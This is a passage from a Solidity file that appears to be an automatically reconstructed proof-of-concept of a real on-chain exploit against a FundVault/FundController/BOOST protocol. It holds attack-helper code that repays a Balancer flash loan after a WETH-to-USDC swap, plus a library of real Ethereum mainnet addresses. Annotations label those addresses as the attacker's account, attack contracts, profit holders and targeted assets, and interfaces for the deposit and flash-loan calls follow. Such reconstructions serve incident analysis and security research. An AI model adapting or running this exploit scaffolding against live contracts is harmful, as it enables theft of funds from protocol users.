        IERC20Like(Addresses.ENX).balanceOf(address(this));
        IERC20Like(Addresses.RNDR).balanceOf(address(this));
        IERC20Like(Addresses.wTAO).balanceOf(address(this));
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.FET).balanceOf(address(this));
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 wethBalanceOfAttackHelper = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.WETH).approve(Addresses.UniswapV2Router02, type(uint256).max);
        if (wethBalanceOfAttackHelper != 0) {
            IUniswapV2Router02(Addresses.UniswapV2Router02)
                .swapTokensForExactTokens(
                    290080,
                    wethBalanceOfAttackHelper,
                    _addressArray2(Addresses.WETH, Addresses.USDC),
                    address(this),
                    1784892251
                );
        }
        IERC20Like(Addresses.USDC).transfer(Addresses.Vault_BA1222, 10000000000);
    }

    function _handleFlash() internal {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_path_entry = 0x038355a7CAb3989c6e28E9Fbda6CD08FF9066787; // Addresses.attack_path_entry = 0x038355a7cab3989c6e28e9fbda6cd08ff9066787 label=attack_path_entry roles=attack_path_entry_contract|attacker_contract|attacker_surface_contract|code_contract|contract|localized_contract|attack_address|poc_reconstruction_surface|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant ENX = 0x0511Df77e420c9c37B065Ddb7973d0f81430a092; // Addresses.ENX = 0x0511df77e420c9c37b065ddb7973d0f81430a092 label=ENIGMA token_symbol=ENX roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant PAPPLE = 0x129E5915326eD86f831b0e035AcdA34b209633D5; // Addresses.PAPPLE = 0x129e5915326ed86f831b0e035acda34b209633d5 label=Token token_symbol=PAPPLE roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x1e7Bd709fb53ef70F6B6f9C04b1bd2e77d0dE29A; // Addresses.attacker_eoa = 0x1e7bd709fb53ef70f6b6f9c04b1bd2e77d0de29a label=attacker_eoa roles=attacker_eoa|code_contract|contract|economic_holder|attack_address|profit_holder|recipient|sender|storage_contract source=tx_metadata.from confidence=high
    address internal constant TOKEN_4507CE = 0x4507cEf57C46789eF8d1a19EA45f4216bae2B528; // Addresses.TOKEN_4507CE = 0x4507cef57c46789ef8d1a19ea45f4216bae2b528 label=T1 token_symbol=TOKEN roles=asset|contract|attack_address|recipient|sender|token_related source=etherscan_v2 confidence=high
    address internal constant DMTR = 0x51cB253744189f11241becb29BeDd3F1b5384fdB; // Addresses.DMTR = 0x51cb253744189f11241becb29bedd3f1b5384fdb label=DimitraToken token_symbol=DMTR roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant BOOST = 0x6B7fBA419AFe1FA90D6F5Eb4C0aF832ebd85D656; // Addresses.BOOST = 0x6b7fba419afe1fa90d6f5eb4c0af832ebd85d656 label=FundLedger token_symbol=BOOST roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant RNDR = 0x6De037ef9aD2725EB40118Bb1702EBb27e4Aeb24; // Addresses.RNDR = 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24 label=AdminUpgradeabilityProxy token_symbol=RNDR roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant wTAO = 0x77E06c9eCCf2E797fd462A92B6D7642EF85b0A44; // Addresses.wTAO = 0x77e06c9eccf2e797fd462a92b6d7642ef85b0a44 label=wTAO token_symbol=wTAO roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Addresses.UniswapV2Router02 = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d label=UniswapV2Router02 roles=code_contract|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FundVault = 0x868847E1a5Ca7489371184eDC19594e2C5F2D8EE; // Addresses.FundVault = 0x868847e1a5ca7489371184edc19594e2c5f2d8ee label=FundVault roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PROOF = 0x9B4a69dE6CA0deFDD02c0c4ce6Cb84de5202944E; // Addresses.PROOF = 0x9b4a69de6ca0defdd02c0c4ce6cb84de5202944e label=ProofToken token_symbol=PROOF roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant GURU = 0xaA7D24c3E14491aBaC746a98751A4883E9b70843; // Addresses.GURU = 0xaa7d24c3e14491abac746a98751a4883e9b70843 label=GURU token_symbol=GURU roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant FET = 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85; // Addresses.FET = 0xaea46a60368a7bd060eec7df8cba43b7ef41ad85 label=FetchToken token_symbol=FET roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant SMT = 0xB17548c7B510427baAc4e267BEa62e800b247173; // Addresses.SMT = 0xb17548c7b510427baac4e267bea62e800b247173 label=SwarmMarketsToken token_symbol=SMT roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.Vault_BA1222 = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=Vault roles=asset|contract|known_protocol|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Addresses.WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 label=WETH9 token_symbol=WETH roles=asset|contract|attack_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant HTS = 0xC40629464351c37c1e1f47b3640eA2e7AeC31eA5; // Addresses.HTS = 0xc40629464351c37c1e1f47b3640ea2e7aec31ea5 label=HTS token_symbol=HTS roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // Addresses.SwapRouter = 0xe592427a0aece92de3edee1f18e0157c05861564 label=SwapRouter roles=attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_child = 0xEb5EeAD804bb31f2fb489186ae448edC1D5A95B9; // Addresses.attack_child = 0xeb5eead804bb31f2fb489186ae448edc1d5a95b9 label=attack_child roles=attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|attack_child_contract|economic_holder|localized_contract|attack_address|poc_reconstruction_surface|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant FundController = 0xF9357A85e79C388c13FB83B237Ff759675CC5977; // Addresses.FundController = 0xf9357a85e79c388c13fb83b237ff759675cc5977 label=FundController roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ONDO = 0xfAbA6f8e4a5E8Ab82F62fe7C39859FA577269BE3; // Addresses.ONDO = 0xfaba6f8e4a5e8ab82f62fe7c39859fa577269be3 label=Ondo token_symbol=ONDO roles=asset|contract|attack_address|recipient|token_related source=etherscan_v2 confidence=high
}

struct FundDepositSwapCall {
    address target;
    bytes callData;
}

struct FundDepositParams {
    address pool;
    address asset;
    uint256 amount;
    FundDepositSwapCall[] swapCalls;
    uint256 minMintAmount;
    uint16 referralCode;
}

struct Abi_exactInputSingleWithDeadline_Param0 {
    address tokenIn;
    address tokenOut;
    uint24 fee;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

interface IBOOST {
    function assetSlot(address) external view returns (uint256);
    function getAssets() external view returns (uint256[] memory);
    function isOpen() external view returns (uint256);
    function minDepositUsd() external view returns (uint256);
    function vault() external view returns (uint256);
}

interface IFundController {
    function deposit(FundDepositParams calldata) external;
}

interface ISwapRouter {
    function exactInputSingle(Abi_exactInputSingleWithDeadline_Param0 calldata) external returns (uint256);
}

interface IUniswapV2Router02 {
    function getAmountsIn(uint256, address[] calldata) external view returns (uint256[] memory);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256)
        external
        returns (uint256[] memory);
}

interface IVault_BA1222 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

interface Iattack_child {
    function run() external;
}
